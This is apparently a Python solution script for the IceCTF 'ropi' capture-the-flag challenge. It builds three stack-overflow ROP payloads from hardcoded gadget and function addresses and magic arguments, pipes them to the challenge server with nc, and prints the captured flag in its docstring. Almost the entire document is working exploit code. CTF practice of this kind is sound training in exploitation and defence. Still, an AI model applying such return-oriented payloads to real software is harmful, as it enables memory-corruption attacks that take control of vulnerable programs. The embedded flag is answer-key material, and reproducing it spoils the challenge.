#!/usr/bin/env python

"""
# main -> ret -> main -> ori -> main -> pro -> "XXXX"

./exploit.py | nc ropi.vuln.icec.tf 6500
Benvenuti al convegno RetOri Pro!
Vuole lasciare un messaggio?
[+] aperto
Benvenuti al convegno RetOri Pro!
Vuole lasciare un messaggio?
[+] leggi
Benvenuti al convegno RetOri Pro!
Vuole lasciare un messaggio?
[+] stampare
IceCTF{italiano_ha_portato_a_voi_da_google_tradurre}
"""

from struct import pack
from sys import stdout

ret     = pack("I", 0x0804837e)
popret  = pack("I", 0x08048395)
pop2ret = pack("I", 0x080486ee)
pop3ret = pack("I", 0x080486ed)
pop4ret = pack("I", 0x080486ec)

func_main = pack("I", 0x08048661)

func_ret       = pack("I", 0x08048569)
func_ret_arg_0 = pack("I", 0xBADBEEEF)

func_ori       = pack("I", 0x080485C4)
func_ori_arg_0 = pack("I", 0xabcdefff)
func_ori_arg_1 = pack("I", 0x78563412)

func_pro       = pack("I", 0x0804862C)

payload = ""

payload += "A" * 44
payload += func_ret
payload += popret
payload += func_ret_arg_0
payload += func_main
stdout.write(payload)

payload = "B" * 48
payload += func_ori
payload += pop2ret
payload += func_ori_arg_0
payload += func_ori_arg_1
payload += func_main
stdout.write(payload)

payload = "C" * 44
payload += func_pro
payload += "XXXX"
stdout.write(payload)
